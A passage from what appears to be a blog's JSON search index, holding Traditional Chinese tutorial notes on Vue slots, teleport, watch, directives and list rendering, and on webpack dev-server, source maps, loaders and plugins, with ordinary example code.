&lt;h1&gt;PeaNu&lt;/h1&gt; &lt;p&gt;peanu@peanu.dev&lt;/p&gt; &lt;!-- naming slot --&gt; &lt;template v-slot:actions&gt; &lt;button class=\"btn\"&gt;Add Friend&lt;/button&gt; &lt;button class=\"btn\"&gt;Block User&lt;/button&gt; &lt;/template&gt; &lt;/Modal&gt;&lt;/template&gt; 上面是把內容寫入 Modal 的 slot 中，Vue 比較特別的地方是還可以幫 slot 命名，使用方式是透過 &lt;template&gt; 和 v-slot:名稱 來定義，接著在元件中就可以透過名稱來做區隔。 Modal.vue： 1234567891011121314&lt;template&gt; &lt;div class=\"backdrop\" @click.self=\"onClick\"&gt; &lt;div class=\"modal\" :class=\"{ sale: isSale }\"&gt; &lt;div class=\"content\"&gt; &lt;!-- basic slot --&gt; &lt;slot&gt;default content&lt;/slot&gt; &lt;div class=\"action\"&gt; &lt;!-- naming slot --&gt; &lt;slot name=\"actions\"&gt;deafault content&lt;/slot&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt; 附註：default content 的意思是預設內容，會在沒有傳入 slot 時顯示 在元件中要接收 slot 會直接透過 &lt;slot&gt; 來接，如果是命名 slot 的話就再加上 name 屬性來區隔開來就行了。 想知道更多細節的話可以到 這裡 看範例會比較快。 順道一提「命名 slot」有提供語法糖，可以用 #name 的方式來表示： 12345678910111213141516&lt;template&gt; &lt;div class=\"container\"&gt; &lt;div class=\"block\"&gt; &lt;button class=\"btn\" @click=\"onOpen\"&gt;Show modal&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;Modal v-show=\"isModal\" :isSale=\"isSale\" @onClose=\"onClose\"&gt; &lt;h1&gt;PeaNu&lt;/h1&gt; &lt;p&gt;peanu@peanu.dev&lt;/p&gt; &lt;!-- 用 # 來表示 --&gt; &lt;template #actions&gt; &lt;button class=\"btn\"&gt;Add Friend&lt;/button&gt; &lt;button class=\"btn\"&gt;Block User&lt;/button&gt; &lt;/template&gt; &lt;/Modal&gt;&lt;/template&gt;","link":"/2022/08/04/vue-slot/"},{"title":"Vue－窩想放到其他位置可以嗎？（Teleport）","text":"雖然還沒實際用過，但還是能了解一下。 這個跟 React－用 portal 把元件移到我想要的位置 在做的事情是一樣的，就是自己決定「元件的渲染位置」： 123456789101112131415161718&lt;template&gt; &lt;div class=\"container\"&gt; &lt;div class=\"block\"&gt; &lt;button class=\"btn\" @click=\"onOpenUser\"&gt;Show user&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- 插到 body 中 --&gt; &lt;teleport to=\"body\"&gt; &lt;Modal v-if=\"isUserModal\" @onClose=\"onUserClose\"&gt; &lt;h1&gt;PeaNu&lt;/h1&gt; &lt;p&gt;peanu@peanu.dev&lt;/p&gt; &lt;template v-slot:actions&gt; &lt;button class=\"btn\"&gt;Add Friend&lt;/button&gt; &lt;button class=\"btn\"&gt;Block User&lt;/button&gt; &lt;/template&gt; &lt;/Modal&gt; &lt;/teleport&gt;&lt;/template&gt; &lt;teleport to=\"...\"&gt; 的內容是「CSS selector」，所以你也可以填入 #body 或 .body 之類的東西，總之只要是合法的就好了。","link":"/2022/08/05/vue-teleport/"},{"title":"Vue－監聽特定的值（watch）","text":"I’ll be wating you. 簡述有時候你可能會想要在 data 改變時做一些事情，例如說一個 Todo-list 更新的時候可能想同步更新到 localStorage 中。 雖然可以透過 beforeUpdate 來處理，不過要知道它的特性是「任何畫面上的資料更新時都會觸發」，這樣就有可能做了無意義的更新，所以才需要用 watch 來「監聽某一個值」。 我覺得這就跟 React 裡 useEffect 的 dependencies array 還蠻相似的，總之它的用法是這樣： 123456789101112131415161718export default { data() { return { todos: [], } } watch: { // 監聽 todos 這個陣列 todos: { // todos 改變時的 handler handler(current, prev) { localStorage.setItem('projects', JSON.stringify(current)) }, // deep comparing deep: true } }} 附註：handler 是 config 的 key，所以不能亂改名。 這邊的寫法是屬於有額外 config 的寫法，因為我們想監聽「整個 toods」的內容，而 todos 顯然是一個 reference type，所以必須讓他用 deep 模式來比對，否則預設只會用 shallow 來做。 如果你想監聽的值是單純的 primitive type，那可以簡化成這樣： 1234567891011121314export default { data() { return { todos: [], filter: 'all' } } watch: { // 監聽 filter 這個字串 filter() { // do something when filter is changed } }} 想知道更多用法可以參考官方文件。","link":"/2022/08/07/vue-watch/"},{"title":"webpack 開發時的一些設定","text":"筆記筆記！ 開啟 dev-server每次都要 npm run build 才能看到結果的話太麻煩了，所以能用 webpack 提供的 dev sever，實現自動重新編譯的功能。 首先參考 官方說明： 安裝 1npm install --save-dev webpack-dev-server 設定 config 123456module.exports = { devServer: { // 打包後的檔案位置 static: './dist' }} 打開 dev server 1npx webpack serve --open 就是這麼簡單囉！ 開啟 source mapsource map 的用途是讓你比較好 debug。 拿一段 code 來舉例： 123456789101112131415// 樣式const css = require('./style.scss')// 隨便寫的模組import { add } from './utils'const a = [1, 2, 3]const b = [...a]for (let c of b) { // 跑到第二圈時丟一個 error if (c === 2) { throw new Error('hahaha') } console.log(c)} 這時候如果要看 code 就會發現摻了一堆 webpack 的東西： 這是因為在跑的時候是執行 bundle 後的檔案，所以這裡的程式碼也當然是打包後的。 所以，為了讓 debug 時能夠看 src（也就是打包前）的程式碼，可以到 config 裡面加上這行： 123module.exports = { devtool: 'inline-source-map'} 有了 source map 以後就會自動把 bundle 跟 src 給對應起來，所以就能看到正常的 code 了：","link":"/2022/03/01/webpack-development-tips/"},{"title":"認識 webpack","text":"前端最強打包工具。 為什麼要用 webpack？我覺得最主要的原因有兩點： 全域變數的衝突 希望在瀏覽器上引入 npm 下載的套件 過去在瀏覽器上引入套件時，通常是： 12345&lt;!-- jQuery --&gt;&lt;script src=\"https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js\"&gt;&lt;/script&gt;&lt;script&gt; // 接著在這裡就能用 $ 或 jQuery 來使用&lt;/script&gt; src 是最簡單的方法，不過現在全域空間中就有 $ 和 jQuery 這兩個變數。 問題來了，如果今天有另一個套件也用 $ 來命名怎麼辦？這個就是全域變數的命名衝突。 但如果是 Node.js 的話就沒有這個問題，因為我們可以這樣做： 12// 自己命名const $ = require('jquery') 所以後來 ES6 推出了「ES Modules」，讓瀏覽器能夠有原生的「模組機制」。 但還是有一些問題： 不是所有瀏覽器都能支援 使用上蠻麻煩的（要加上 type=module 和搭配 server 執行才能使用） 依然沒辦法用把 node_modules 裡的東西引入進來用 永遠記得一句話： 瀏覽器不支援或支援度很差的話，就自己寫一個工具來讓它支援就好了。 所以為了解決以上問題，webpack 就誕生了。 如果我想要引入用 npm 下載的 jquery，我可以開一支檔案來寫 jQuery： 123456789// CommonJSconst myjQuery = require('jquery')myjQuery('body').css('background-color', 'rgba(0, 255, 0, 0.2)')myjQuery('.btn').on('click', () =&gt; console.log('click'))// ES modulesimport jq from 'jquery'jq('body').css('background-color', 'rgba(0, 0, 255, 0.2)')jq('.btn').on('click', () =&gt; console.log('click')) 不管我要在裡面用 CommonJS 或 ES modules 來引入都沒問題。我只要記得寫好後用 webpack 打包，接著在 HTML 裡面加上一句： 12&lt;!-- 打包好的模組 --&gt;&lt;script src=\"./bundle.js\"&gt;&lt;/script&gt; 一切就完成了，而且還真的可以跑，很神奇吧？但不要忘了，這一切都是因為有 webpack 幫你在背後做處理，否則瀏覽器不可能做得到這些。 至於為什麼 webpack 可以做到？你可以想成是「webpack 直接幫你在瀏覽器上實作 require 或 import 這兩個函式」，大概是這樣。 總而言之，再次強調： webpack 是用來把模組打包起來的工具 webpack 是用來把模組打包起來的工具 webpack 是用來把模組打包起來的工具 補充－引入時是怎麼從 npm 裡面找到的？其實沒有什麼黑魔法，以 jQuery 的例子來說，你可以在 node_modules 裡找到 jquery，資料夾結構大概是這樣： 1234567891011121314151617│ AUTHORS.txt│ bower.json│ LICENSE.txt│ package.json│ README.md│├───dist│ jquery.js│ jquery.min.js│ jquery.min.map│ jquery.slim.js│ jquery.slim.min.js│ jquery.slim.min.map│├───external│└───src 接著打開 package.json 搜尋 main 會看到： 123{ \"main\": \"dist/jquery.js\"} 所以這就是被引入進來的 jQuery。其他套件也是這樣運作的，真的沒有什麼黑魔法，只是這樣而已。 webpack.config 基本結構config 是用來設定 webpack 要怎麼打包，或是一些額外資訊，這邊先寫個最簡單的架構： 123456789101112module.exports = { // 進入點，簡單來說就是引入所有 module 的那支檔案 entry: './src/main.js', // development 或 production（預設） mode: 'production', output: { // 輸出位置 path: __dirname, // 檔案名稱 filename: 'bundle.js' }} 認識 loaderwebpack 強大的地方在於它不只把 JavaScript 當作模組，甚至能把圖片、CSS 等資源都當成是模組。 為了實現這個功能，必須要有一個東西來處理，那個東西就是「loader」。 簡單來說就是把「資源」載入成「瀏覽器看的懂的東西」，這就是 loader 的負責的工作。 這邊做個示範，假設我想要在 JavaScript 裡面載入 CSS： 123// 兩種都可以import css from './style.css'const css = require('./style.css') 為了載入 CSS，我需要兩個 loader： css-loader 解析 CSS 內容 style-loader 把 CSS 插入 DOM 接著到 config 裡面設定 rule： 1234567891011121314151617181920module.exports = { entry: './src/main.js', mode: 'development', output: { path: __dirname, filename: 'bundle.js' }, // 在這裡設定 module: { rules: [ { // 所有 .css 結尾的檔案 test: /\\.css$/i, // 注意順序是「由後往前」， // 先執行 css-loader 再執行 style.loader use: ['style-loader', 'css-loader'] } ] }} 接著一樣 npm run build 打包，再載入 bundle.js 就完成了。 總之呢，基本規則都是這樣： 找出可以解析那個檔案格式的 loader 設定 config 中的 rules 打包 所以要載入 scss 的 config 就會這樣寫： 1234567891011121314151617181920212223module.exports = { entry: './src/main.js', mode: 'development', output: { path: __dirname, filename: 'bundle.js' }, module: { rules: [ { // 所有 .sass 和 .scss 結尾的檔案 test: /\\.s[ac]ss$/i, /* 由後往前執行： 1. sass-loader 2. css-loader 3. style-loader */ use: ['style-loader', 'css-loader', 'sass-loader'] } ] }} 認識 plug-inwebpack 本身也有一些能用的 plug-in，這邊拿 HtmlWebpackPlugin 來舉例。 簡單來說，這個 plug-in 是用來自動產生 HTML 檔。用的方式很簡單，安裝好後設定 config 就行了： 123456789101112131415161718// 引入 plug-inconst HtmlWebpackPlugin = require('html-webpack-plugin')const path = require('path')module.exports = { entry: './src/main.js', mode: 'development', output: { path: path.resolve(__dirname, 'dist'), filename: 'bundle.js' }, // 設定 plug-in plugins: [ new HtmlWebpackPlugin({ template: 'src/index.html' }) ]} template 可以指定樣板。簡單來說就是叫 webpack 用 src 底下的 HTML 來產生，這樣就能先寫好 HTML 的內容。 最後只要打包就會自動產生 index.html。","link":"/2022/03/01/webpack-usage/"},{"title":"Vue的學習紀錄","text":"最近正在學習 Vue，想給自己做一份筆記。 這篇文章的主要參考資料為 Vue 的官方教程。 Hello World1234567891011&lt;div id=\"app\"&gt; &lt;!-- ↓ 這個是原始的寫法 --&gt; &lt;p v-text=\"message\"&gt;&lt;/p&gt; &lt;!-- ↓ 這個是縮寫的寫法 --&gt; &lt;!-- ↓ 從 Vue的 data 中撈出 message 的值 --&gt; {{ message }}&lt;/div&gt;&lt;!-- ↓ Vue 的 cdn --&gt;&lt;script src=\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\"&gt;&lt;/script&gt; 123456789// ↓ 建立 Vue 的物件實體let app = new Vue({ // ↓ 綁定到哪個 HTML 元素上 el: '#app', // ↓ 資料內容 data: { message: 'Hello Vue.' }}) Vue 中的資料都是動態的，妳資料一更改，顯示出的內容也會同步跟著做更改。 如果你希望資料不要被動態更新，你可以使用v-once這個屬性。 1234&lt;div id=\"app\"&gt; &lt;!-- ↓ 加上 v-once --&gt; &lt;p v-once class=\"btn\"&gt;{{ msg }}&lt;/p&gt;&lt;/div&gt; 在內容中帶入 JS 的表達式除了直接把 Vue 的資料寫入之外，我們也可以在{{ }}裡面添加表達式來產生出不同的資料。 123456&lt;div id=\"app\"&gt; &lt;!-- ↓ 直接寫入資料 --&gt; &lt;p&gt;原價：${{ price }}&lt;/p&gt; &lt;!-- ↓ 算數運算表達式 --&gt; &lt;p&gt;折扣價：${{ price * discount }}&lt;/p&gt;&lt;/div&gt; 1234567let vm = new Vue({ el: '#app', data: { price: 100, discount: 0.8 }}) 1234&lt;div id=\"app\"&gt; &lt;!-- ↓ 三元運算子 --&gt; &lt;p&gt;不可吃油炸物：{{ agree ? '同意' : '不同意' }}&lt;/p&gt;&lt;/div&gt; 123456let vm = new Vue({ el: '#app', data: { agree: true }}) 1234&lt;div id=\"app\"&gt; &lt;!-- ↓ 添加表達式 --&gt; &lt;p class=\"btn\"&gt;{{ msg.split('').reverse().join('') }}&lt;/p&gt;&lt;/div&gt; 123456let vm = new Vue({ el: '#app', data: { msg: '把這段文字反過來念' }}) 寫入 HTML 內容使用{{ }}來輸出的內容都會以純文字來做輸出，所以如果你想寫入 HTML 的話，必須改使用v-html。 123456&lt;div id=\"app\"&gt; &lt;!-- ↓ 輸出純文字內容 --&gt; &lt;p&gt;{{ htmlData }}&lt;/p&gt; &lt;!-- ↓ 輸出 HTML 內容 --&gt; &lt;p v-html=\"htmlData\"&gt;&lt;/p&gt;&lt;/div&gt; 123456let vm = new Vue({ el: '#app', data: { htmlData: '&lt;span class=\"txt--blue\"&gt;這段文字應該要是藍色的&lt;/span&gt;' }}) 💡 註：寫入 HTML 內容就意味著有 XSS 的風險，這一點要多留意一下。 綁定 HTML 屬性值 v-bind:attr = 我要把哪一個屬性綁定到 Vue？ v-bind:attr=\"value\" = 參考到 Vue 實體中的 value 值。 12345&lt;div id=\"app\"&gt; &lt;!-- ↓ 把 title 屬性綁定到 Vue --&gt; &lt;!-- ↓ title 的屬性值為在 Vue 中的 time 的值 --&gt; &lt;span v-bind:title=\"time\"&gt;秀出讀取該頁面的時間點&lt;/span&gt;&lt;/div&gt; 12345678let app = new Vue({ el: '#app', data: { // ↓ 資料內容 time: `${new Date().toLocaleString()} 頁面載入完成。` }}) 如果你去改time的值，那title屬性的值也會跟著同步更新。 像是disabled這種屬性也能透過 v-bind 來綁定，並用boolean來控制。 123&lt;div id=\"app\"&gt; &lt;button class=\"btn\" v-bind:disabled=\"isButtonDisabled\"&gt;A button&lt;/button&gt;&lt;/div&gt; 1234567let vm = new Vue({ el: '#app', data: { // ↓ 透過 Boolean 來控制按鈕的啟用與關閉 isButtonDisabled: true }}) 動態參數我們前面用的v-bind:href, v-bind:disabled等，這些放在:(冒號)後面的值都我們稱為參數。 如果現在想使用變數來表示這些參數，可以使用[ ]來實現。 💡 註 1：動態參數聽起來有點繞口，但是其實是因為我們在 Vue 中定義的變數都會動態更新，所以才會用動態這個詞來解釋吧。💡 註 2：[ ]只接受字串值 1234567&lt;div id=\"app\"&gt; &lt;!-- ↓ 原本的寫法 --&gt; &lt;a v-bind:href=\"url\"&gt;link-1&lt;/a&gt; &lt;!-- ↓ 改用變數來代替 --&gt; &lt;a v-bind:[attribute]=\"url\"&gt;link-2&lt;/a&gt;&lt;/div&gt; 12345678let vm = new Vue({ el: '#app', data: { // ↓ 用來當作參數 attribute: 'href', url: 'https://www.google.com/' }}) 事件綁定也是以此類推。 123456&lt;div id=\"app\"&gt; &lt;!-- ↓ 原始寫法 --&gt; &lt;button class=\"btn\" v-on:click=\"count++\"&gt;{{ count }}&lt;/button&gt; &lt;!-- ↓ 改用變數來代替 --&gt; &lt;button class=\"btn\" v-on:[eventname]=\"count++\"&gt;{{ count }}&lt;/button&gt;&lt;/div&gt; 12345678let vm = new Vue({ el: '#app', data: { count: 0, // ↓ 用來當作參數 eventname: 'click' }}) 💡 註 1：這裡不要用駝峰式來命名，因為此處的 HTML 無法透過Kebab-case (連字符號)來讀取，而是會直接轉成小寫。💡 註 2：如果想要解除綁定，可以將參數值設為null 寫成變數的好處是，可以帶入表達式。 12&lt;!-- ↓ 帶入表達式 --&gt;&lt;p v-bind:[foo+\"le\"]=\"value\"&gt;把游標放上來&lt;/p&gt; 123456789let vm = new Vue({ el: '#app', data: { count: 0, // ↓ 用來當作參數 foo: 'tit', value: '真聽話' }}) 💡 註 ：這裡只是方便示範才這樣寫，實際使用表達式時，請盡量避免出現空格, 引號等特殊字符，否則可能會報錯。 修飾子v-指令後面除了接:參數以外，也可以接.修飾子。 123456789&lt;div id=\"app\"&gt; &lt;!-- ↓ 使用修飾子來終止元素的預設行為 --&gt; &lt;form v-on:submit.prevent=\"onSubmit\"&gt; &lt;!-- ↓ 送出鈕 --&gt; &lt;input type=\"submit\" value=\"Send\" /&gt; &lt;!-- ↓ 當按下送出鈕時才會顯示的文字 --&gt; &lt;p v-if=\"isSended\"&gt;已按下送出鈕。&lt;/p&gt; &lt;/form&gt;&lt;/div&gt; 123456789101112let vm = new Vue({ el: '#app', data: { isSended: false }, methods: { onSubmit: function () { // ↓ 改變 isSended 的值 this.isSended = true } }}) 注意到表單並沒有被送出（沒有重新渲染的動作），這就是修飾子.prevent帶來的作用。 v-if 元素的顯示與隱藏透過v-if可以決定一個元素要顯示 or 隱藏。 如果是truthy，元素會顯示出來。 如果是falsy，元素會隱藏起來。 123456&lt;div id=\"app\"&gt; &lt;!-- ↓ 判斷 Vue 中 exist 的值 --&gt; &lt;p v-if=\"exist\"&gt;妳看的到我&lt;/p&gt; &lt;!-- ↓ 判斷 Vue 中 notExist 的值 --&gt; &lt;p v-if=\"notExist\"&gt;妳看不到我&lt;/p&gt;&lt;/div&gt; 12345678910let app = new Vue({ el: '#app', data: { // ↓ 元素會顯示 exist: true, // ↓ 元素會隱藏 notExist: false }}) 也可以添加一個v-else。 123456&lt;div id=\"app\"&gt; &lt;!-- ↓ 判斷 Vue 中 exist 的值 --&gt; &lt;p v-if=\"exist\"&gt;今天有晚餐吃&lt;/p&gt; &lt;!-- ↓ 若 v-if 不成立，顯示這個元素 --&gt; &lt;p v-else&gt;今天沒晚餐吃&lt;/p&gt;&lt;/div&gt; 💡 註：v-else 必須緊跟在 v-if 或 v-else-if 的元素後面，否則無法被識別。 或者是v-else-if 123456789&lt;h1&gt;Hello&lt;/h1&gt;&lt;!-- ↓ countSister 為 1--&gt;&lt;p v-if=\"countSister === 1\"&gt;You have a sister.&lt;/p&gt;&lt;!-- ↓ countSister 為 2--&gt;&lt;p v-else-if=\"countSister === 2\"&gt;You have two sisters.&lt;/p&gt;&lt;!-- ↓ countSister 為 3--&gt;&lt;p v-else-if=\"countSister === 3\"&gt;You have three sisters.&lt;/p&gt;&lt;!-- ↓ countSister 不為 1,2,3 --&gt;&lt;p v-else&gt;Wake up, you have too more sister or you don't even have a sister.&lt;/p&gt; 💡 註：v-else-if 一樣要跟在 v-if 或 v-else-if 的元素後面，否則無法被識別。 所以除了前面的文字、屬性之外，Vue 還能夠控制 DOM 的結購 控制多個元素如果一次想控制多個元素的顯示與否，可以使用&lt;template&gt;元素將元素給群組起來。 12345&lt;template v-if=\"noSister\"&gt; &lt;h1&gt;Hello&lt;/h1&gt; &lt;p&gt;Wake up, you don't have a sister.&lt;/p&gt; &lt;p&gt;You only have a brother.&lt;/p&gt;&lt;/template&gt; 這樣子最後的結果不會渲染出&lt;template&gt;，只會有裡面的內容。 節能機制與 key 屬性為了省掉不必要的浪費，若沒有必要的話，Vue 會盡量用目前存在的元素來做修改內容，而不是把整個元素重新渲染一次。 1234567891011&lt;!-- ↓ loginType 為 username --&gt;&lt;template v-if=\"loginType === 'username' \"&gt; &lt;label for=\"username\"&gt;Username:&lt;/label&gt; &lt;input id=\"username\" type=\"text\" placeholder=\"輸入使用者名稱\" /&gt;&lt;/template&gt;&lt;!-- ↓ loginType 不為 username --&gt;&lt;template v-else&gt; &lt;label for=\"email\"&gt;Username:&lt;/label&gt; &lt;input id=\"email\" type=\"email\" placeholder=\"輸入信箱\" /&gt;&lt;/template&gt; 當我們切換的時，你能看到元素沒有重新渲染，只有屬性跟內容的部分被修改，並且我們輸入的值也繼續停留在輸入格中。 如果不想套用這種機制，可以在元素中加入key屬性來讓元素具有唯一性。 12345678910111213141516&lt;!-- ↓ loginType 為 username --&gt;&lt;template v-if=\"loginType === 'username' \"&gt; &lt;label for=\"username\"&gt;Username:&lt;/label&gt; &lt;input id=\"username\" type=\"text\" placeholder=\"輸入使用者名稱\" key=\"typeOfUsername\" /&gt;&lt;/template&gt;&lt;!-- ↓ loginType 不為 username --&gt;&lt;template v-else&gt; &lt;label for=\"email\"&gt;Username:&lt;/label&gt; &lt;input id=\"email\" type=\"email\" placeholder=\"輸入信箱\" key=\"typeOfEmail\" /&gt;&lt;/template&gt; 現在兩個&lt;input&gt;各自具有唯一性，所以切換時會重新渲染，至於&lt;label&gt;還是繼續使用節能機制，只有內容被修改。 v-show一個跟v-if很類似的指令，用法上大致相同 1&lt;p v-show=\"ok\"&gt;只是段文字&lt;/p&gt; 💡 註：v-show 不支援 &lt;template&gt; 與 v-else 。 不過它跟v-if有個很大的差異在於：是否會渲染到DOM中？ v-show的元素是利用 CSS 中的display來控制元素是否要顯示，所以不論顯示與否，這個元素在一開始都會被渲染到 DOM 中。 v-if會根據條件來判斷是否要把元素渲染到 DOM 中，所以如果條件不成立，元素就真的不會被渲染到 DOM 中。 所以如果某個元素經常在顯示與隱藏間做切換，v-if會比較適合。 反之，如果某個元素不常在顯示與隱藏間做切換，v-show會比較適合。 v-for 重複產生元素透過v-for可以來根據資料的數量（length），來產生出對應數量的元素。 💡 註 1：v-for寫在哪個元素身上，哪個元素就會重複產生 。💡 註 2：item in list 也可以寫成 item of list。 迭代的資料為陣列123456&lt;ul class=\"menu\"&gt; &lt;!-- ↓ 迭代 dinnerList 這個陣列 --&gt; &lt;!-- ↓ item 是自訂的變數名稱 --&gt; &lt;!-- ↓ 用來代表陣列中每一個項目的值 --&gt; &lt;li class=\"btn\" v-for=\"item of dinnerList\"&gt;{{ item }}&lt;/li&gt;&lt;/ul&gt; 123456let vm = new Vue({ el: '#app', data: { dinnerList: ['豬排飯', '咖哩飯', '炒飯', '麵包', '拉麵'] }}) 你也可以把這段過程想像成是這樣子： 123for (let i = 0; i &lt; foods.length; i++) { li.textContent = foods[i]} 迭代的陣列為物件12345&lt;ul class=\"menu\"&gt; &lt;!-- ↓ 與剛剛一樣，只是現在資料變成是物件 --&gt; &lt;!-- ↓ info 代表物件中每個屬性的值 --&gt; &lt;li class=\"btn\" v-for=\"info in character\"&gt;{{ info }}&lt;/li&gt;&lt;/ul&gt; 12345678910111213let vm = new Vue({ el: '#app', data: { // ↓ 物件格式的資料 character: { name: '煉獄杏壽郎', level: '炎柱', sex: '男', age: '20歲', death: '被猗窩座打死' } }}) 第二個可選參數如果想要取得迭代元素的索引值，可以加入第二個可選參數。 12345678&lt;ul class=\"menu\"&gt; &lt;!-- ↓ 迭代 dinnerList 這筆資料 --&gt; &lt;!-- ↓ item 為資料陣列中的 每個項目 --&gt; &lt;!-- ↓ index 為迭代項目中的 索引值 --&gt; &lt;li class=\"btn\" v-for=\"(item, index) in dinnerList\"&gt; {{ index }} {{ item }} &lt;/li&gt;&lt;/ul&gt; 123456let vm = new Vue({ el: '#app', data: { dinnerList: ['豬排飯', '咖哩飯', '炒飯', '麵包', '拉麵'] }}) 如果迭代的資料是物件的話，第二個參數可以用來表示物件中的鍵名(key) 12345&lt;ul class=\"menu\"&gt; &lt;!-- ↓ value 為 鍵值 --&gt; &lt;!-- ↓ key 為 鍵名--&gt; &lt;li class=\"btn\" v-for=\"(value, key) in character\"&gt;{{ key }}：{{ value }}&lt;/li&gt;&lt;/ul&gt; 如果想在物件中取得索引值，可以加入第三個參數來取得。 12345678&lt;ul class=\"menu\"&gt; &lt;!-- ↓ value 為 鍵值 --&gt; &lt;!-- ↓ key 為 鍵名--&gt; &lt;!-- ↓ index 為 索引值--&gt; &lt;li class=\"btn\" v-for=\"(value, key, index) in character\"&gt; ({{index}}) {{ key }}：{{ value }} &lt;/li&gt;&lt;/ul&gt; 指定特定數值除了迭代一個陣列或物件以外，你也可以直接指定一個數字來重複產生元素。 1234&lt;ul class=\"list\"&gt; &lt;!-- ↓ 產生 12 個元素 --&gt; &lt;li class=\"btn\" v-for=\"i in 12\"&gt;{{ i }}&lt;/li&gt;&lt;/ul&gt; 🚀 Codepen：點這裡 重複產生多個元素與 v-if 的概念一樣，如果要產生的是一組元素，可以用 &lt;template&gt; 來把它們給包起來。 12345678&lt;!-- 產生 5 組下面的元素們 --&gt;&lt;template v-for=\"i in 5\"&gt; &lt;h2 class=\"title\"&gt;產生1 ~ 12&lt;/h2&gt; &lt;ul class=\"list\"&gt; &lt;!-- 產生 12 個元素 --&gt; &lt;li class=\"btn\" v-for=\"i in 12\"&gt;{{ i }}&lt;/li&gt; &lt;/ul&gt;&lt;/template&gt; 🚀 Codepen：點這裡 節能機制與 key 屬性前面提到的節能機制，在v-for中也會套用。 如果v-for迭代的資料發生了更新，為了節省資源，Vue 一樣會盡可能使用現有的元素來做修改，而不是把整個資料給重新渲染一次。 🚀 Codepen：點這裡 💡 註 ：仔細看，只有內容的部分被更新，但元素並沒有被重新渲染。 如果一個列表只是單純用來顯示內容，那這種節能機制確實是沒什麼問題的。 但如果是像上面的情況，這個列表會與使用者互動，那就會讓人感到有點困惑。 要解決節能機制的副作用，一樣是加上key這個屬性來讓元素具有唯一性，確保它能夠被重新渲染。 🚀 Codepen：點這裡 💡 註 ：現在當資料更新時，整個&lt;div&gt;都會被重新渲染，而位置是正確的。 陣列的更新由於 Vue 會隨著資料的更新來更新畫面，所以如果你使用了會影響原始陣列本身的方法，像是： push() pop() shift() unshift() splice() sort() reverse() 當陣列被更新後，畫面就會隨著陣列中資料的改變來同步更新。 如果你不希望這樣的話，可以改使用不影響原始陣列的方法，像是： filter() concat() slice() 這些方法都是回傳一個新的陣列，所以才不會影響到原始陣列。 舉一個常見的例子，假設我們想要對一份資料做篩選，這時並不會希望直接去動原本的資料，而是能夠再產生出一份篩選過後的資料。 這個時候就可以利用上面提的方法以及 computed 屬性來實作。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556let vm = new Vue({ el: '#app', data: { // ↓ 所有的項目 mantous: [ '蛋黃鮮肉包', '香菇薑汁鮮肉包', '黑米椰香芋頭包', '黑糖地瓜包', '蔥肉包', '咖啡奶酥饅頭', '全麥堅果饅頭', '黑糖桂圓枸杞饅頭', '蔥花捲饅頭', '黑糖饅頭', '鮮奶饅頭', '芋籤饅頭', '山東饅頭', '全麥饅頭', '紅藜全麥饅頭', '起司肉包', '全麥雜糧饅頭', '芋泥捲', '芋泥饅頭', '地瓜芋頭饅頭', '芋圓饅頭' ] }, // ↓ 篩選過後的項目 computed: { // ↓ 芋頭控 taros: function () { return this.mantous.filter(function (item) { return item.includes('芋') }) }, // ↓ 肉肉控 meats: function () { return this.mantous.filter(function (item) { return item.includes('肉') }) }, // ↓ 黑糖控 brownSugar: function () { return this.mantous.filter(function (item) { return item.includes('黑糖') }) }, // ↓ 養生控 healthy: function () { return this.mantous.filter(function (item) { return item.includes('麥') }) } }}) 🚀 Codepen：點這裡 v-for 比 v-if 的優先權高這裡先參考 Vue 的一段源碼： 1234567891011121314151617181920212223export function genElement (el: ASTElement, state: CodegenState): string { if (el.parent) { el.pre = el.pre || el.parent.pre } if (el.staticRoot &amp;&amp; !el.staticProcessed) { return genStatic(el, state) } else if (el.once &amp;&amp; !el.onceProcessed) { return genOnce(el, state) // 執行 v-for } else if (el.for &amp;&amp; !el.forProcessed) { return genFor(el, state) // 執行 v-if } else if (el.if &amp;&amp; !el.ifProcessed) { return genIf(el, state) } else if (el.tag === 'template' &amp;&amp; !el.slotTarget &amp;&amp; !state.pre) { return genChildren(el, state) || 'void 0' } else if (el.tag === 'slot') { return genSlot(el, state) } else { // component or element ...} 從源碼中可以看到，v-for 會先執行，接著才執行 v-if，所以 v-for 的優先權比 v-if 來得高。 而如果我們在一個元素上同時進行 v-for 跟 v-if，代表 v-if 在每一次的循環中都會被執行一次。 這樣子的作法是比較浪費效能的，舉例來說，如果我們只想顯示庫存產品，但我們每次在渲染的時候，都得先迭代所有產品，再從所有產品中判斷該產品是否還有庫存。 12345678&lt;h2 class=\"title\"&gt;販售中&lt;/h2&gt;&lt;ul class=\"list\"&gt; &lt;!-- ↓ 1. 循環所有產品 --&gt; &lt;!-- ↓ 2. 判斷產品數量 --&gt; &lt;li class=\"btn\" v-for=\"mantou in mantous\" v-if=\"mantou.quantity\"&gt; {{ mantou.name }} &lt;/li&gt;&lt;/ul&gt; 123456789101112131415161718192021222324252627let vm = new Vue({ el: '#app', data: { mantous: [ { name: '蛋黃鮮肉包', quantity: 10 }, { name: '香菇薑汁鮮肉包', quantity: 0 }, { name: '黑米椰香芋頭包', quantity: 10 }, { name: '黑糖地瓜包', quantity: 0 }, { name: '蔥肉包', quantity: 0 }, { name: '咖啡奶酥饅頭', quantity: 0 }, { name: '全麥堅果饅頭', quantity: 10 }, { name: '黑糖桂圓枸杞饅頭', quantity: 10 }, { name: '蔥花捲饅頭', quantity: 0 }, { name: '黑糖饅頭', quantity: 0 }, { name: '鮮奶饅頭', quantity: 10 }, { name: '芋籤饅頭', quantity: 0 }, { name: '山東饅頭', quantity: 0 }, { name: '全麥饅頭', quantity: 10 }, { name: '紅藜全麥饅頭', quantity: 0 }, { name: '起司肉包', quantity: 0 }, { name: '全麥雜糧饅頭', quantity: 0 }, { name: '芋泥捲', quantity: 0 }, { name: '芋泥饅頭', quantity: 10 }, { name: '芋圓饅頭', quantity: 10 } ] }}) 🚀 Codepen：點這裡 想像一下如果有 10 個地方都會用到販售中的這份清單，那上面的流程就得跑 10 次，這顯然不是個好做法對吧？ 比較好的做法是把販售中的這份清單先透過 computed 先做過濾，並且把結果緩存起來。 123456&lt;h2 class=\"title\"&gt;販售中&lt;/h2&gt;&lt;ul class=\"list\"&gt; &lt;!-- ↓ 使用 